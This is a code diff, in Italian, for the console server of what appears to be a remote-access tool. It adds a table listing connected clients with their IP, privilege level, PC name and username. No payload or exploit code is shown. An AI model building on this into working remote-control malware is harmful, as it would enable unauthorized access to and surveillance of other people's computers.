@@ -32,6 +32,8 @@ int main()
     Clu = new ClientUtils(settaggi);
 
     VectString MenuPrincipale;
+    VectString HeaderTabella;
+    VectString BodyTabella;
 
     bool CicloMenu = true;
 
@@ -40,6 +42,14 @@ int main()
     MenuPrincipale.push_back("Crea Client");
     MenuPrincipale.push_back("Comandi Comuni");
     MenuPrincipale.push_back("Impostazioni");
+
+    HeaderTabella.push_back("ID");
+    HeaderTabella.push_back("IP");
+    HeaderTabella.push_back("Ver");
+    HeaderTabella.push_back("UAC");
+    HeaderTabella.push_back("Nome PC");
+    HeaderTabella.push_back("UserName");
+    HeaderTabella.push_back("Stato");
 
     if (!settaggi.GetSettings())
     {
@@ -61,6 +71,7 @@ int main()
         _getch();
         return 0;
     }
+
     thread Tconn(AccettaConnessioni, ref(Server));
     Tconn.detach();
 
@@ -74,23 +85,45 @@ int main()
         {
             // Esci
             case 0:
+                // funzione per gestire la chiusura della connessione con i client attivi
+                Server.Stop();
                 CicloMenu = false;
-            break;
+                break;
 
             // Connetti Sessione
             case 1:
-                return 0;
-            break;
+                system("cls");
+                StampaTitolo(1);
+                cli.SubTitle("Lista Clients", 60, tc.Green);
+
+                for (int i = 0; i < MAX_CLIENTS; i++)
+                {
+                    if (Clients[i].IsConnected)
+                    {
+                        BodyTabella.push_back(to_string(i));
+                        BodyTabella.push_back(Clients[i].info.IP);
+                        BodyTabella.push_back(Clients[i].info.Versione);
+                        BodyTabella.push_back( (Clients[i].info.UAC) ? "Admin" : "User" );
+                        BodyTabella.push_back(Clients[i].info.PCname);
+                        BodyTabella.push_back(Clients[i].info.UserName);
+                        BodyTabella.push_back(Clients[i].info.Nazione);
+                    }
+                }
+
+                cli.Table(HeaderTabella, BodyTabella);
+                system("pause");
+
+                break;
 
             // Crea Client
             case 2:
                 return 0;
-            break;
+                break;
 
             // Comandi Comuni
             case 3:
                 return 0;
-            break;
+                break;
 
             // Impostazioni
             case 4:
@@ -107,23 +140,23 @@ int main()
                         // Esci
                         case 0:
                             CicloMenu = false;
-                        break;
+                            break;
 
                         // Porta
                         case 1:
                             StampaPrefix(1); cout << "Inserisci la porta: ";
                             cin >> settaggi.Porta;
-                        break;
+                            break;
 
                         // Aggiornamenti
                         case 2:
                             settaggi.VerificaAggiornamenti = !settaggi.VerificaAggiornamenti;
-                        break;
+                            break;
 
                         // Colori
                         case 3:
                             //TODO implementare l'impostazione dei colori
-                        break;
+                            break;
 
                         // Dimensione della finestra
                         case 4:
@@ -132,14 +165,14 @@ int main()
 
                             settaggi.DimensioniFinestra.X = wu.GetWindowSize().X;
                             settaggi.DimensioniFinestra.Y = wu.GetWindowSize().Y;
-                        break;
+                            break;
                     }
 
                     settaggi.SetSettings();
                 }
                 
                 CicloMenu = true;
-            break;
+                break;
         }
     }
 
